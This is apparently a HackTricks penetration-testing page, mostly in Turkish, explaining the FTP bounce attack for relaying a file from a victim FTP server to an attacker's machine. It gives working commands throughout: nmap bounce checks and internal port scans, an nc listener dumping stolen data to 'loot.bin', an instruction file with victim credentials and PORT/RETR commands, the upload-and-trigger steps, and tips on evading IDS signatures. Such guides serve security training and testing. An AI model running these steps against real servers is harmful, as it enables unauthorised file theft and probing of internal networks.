# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Özet

Eğer bir **bounce FTP server**'a erişiminiz varsa, bunu **another FTP server** (bazı kimlik bilgilerini bildiğiniz) üzerinden dosya istemesi ve o dosyayı kendi sunucunuza indirmeniz için kullanabilirsiniz.

## Gereksinimler

- Geçerli FTP kimlik bilgileri **FTP Middle server**'da
- Geçerli FTP kimlik bilgileri **Victim FTP server**'da
- Her iki sunucu da **accept the `PORT` command** (bounce FTP attack)
- **FTP Middle server**'ın bazı dizinlerine **write** yapabiliyor olmalısınız
- Middle server'ın Victim FTP Server içinde sizden daha fazla **more access**'a sahip olması

## Adımlar

1. **your own FTP server**'a bağlanın ve bağlantıyı pasif (`pasv` command) hale getirin; böylece victim service'in dosyayı göndereceği bir dizinde **listens** konumunda olur.
2. FTP Middle server'ın Victim server'a göndereceği dosyayı (the **exploit script**) hazırlayın. Bu dosya, Victim server'a kimlik doğrulama yapmak, dizini değiştirmek ve bir dosyayı kendi sunucunuza indirmek için gereken komutları içeren düz metin olacaktır.
3. **FTP Middle Server**'a bağlanın ve önceki dosyayı yükleyin.
4. FTP Middle server'ın Victim server ile **establish a connection** kurmasını sağlayın ve exploit dosyasını gönderin.
5. Kendi FTP sunucunuzda dosyayı **Capture** edin.
6. FTP Middle server'dan exploit dosyasını **Delete** edin.

## Quick check for vulnerable bounce hosts

- **Nmap** hala FTP bounce kontrollerini destekler. Potansiyel bir middle server'ı doğrulamak için örnek:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
If the server refuses third‑party `PORT` values the scan will fail; some **embedded/legacy printers, NAS and appliance FTP daemons** still allow it.

## İkinci FTP indirmesini otomatikleştirme

Aşağıda, zayıf bir orta FTP sunucusu üzerinden bir dosya çekmenin modernleştirilmiş bir yolu gösterilmiştir.

1. **Saldırı kutunuzda pasif bir listener açın** (herhangi bir TCP sink işe yarar):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **IP'nizi** `A,B,C,D` ve portu `P`'yi `p1,p2` olarak not edin (`p1 = P/256`, `p2 = P%256`).

3. **Orta sunucunun kurbana yeniden oynatacağı talimat dosyasını oluşturun**:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Orta sunucudan yükleyin ve tetikleyin** (klasik proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Listener'ınızdan** (`loot.bin`) dosyayı alın.
6. Orta sunucuda yüklenen `instrs` dosyasını temizleyin.

Notlar:
- Padding (`dd ...`) RETR bitmeden önce kontrol bağlantısının kapanmasını engeller (klasik yazılarda tartışılan büyük TCP pencere sorunu).
- FTP PASV soketinin yerine **listen and dump TCP** yapabilen herhangi bir servis kullanılabilir (ör., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Orta sunucu ayrıcalıklı portları kısıtlıyorsa, `PORT` içinde yüksek bir port kullanın ve listener'ınızı uygun şekilde ayarlayın.

## Ek ipuçları

- Dosya relay'i engellendiğinde iç hostları **port-scan internal hosts** etmek için bounceable bir FTP sunucusu kullanın:
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Bazı modern WAF/IDS'ler (ör. Juniper IPS) özel olarak **FTP:EXPLOIT:BOUNCE-ATTACK** imzaları ile gelir; gürültülü payload'lar veya eksik padding bunları tetikleyebilir.
- Orta sunucu "PORT to same host" kısıtlaması uygularsa (yazma/çalıştırma izniniz varsa), listener'ınızı doğrudan orta sunucuya yerleştirip yakalanan dosyayı daha sonra aktarın.

Daha ayrıntılı eski usul bir anlatım için bakın: [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## Referanslar

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
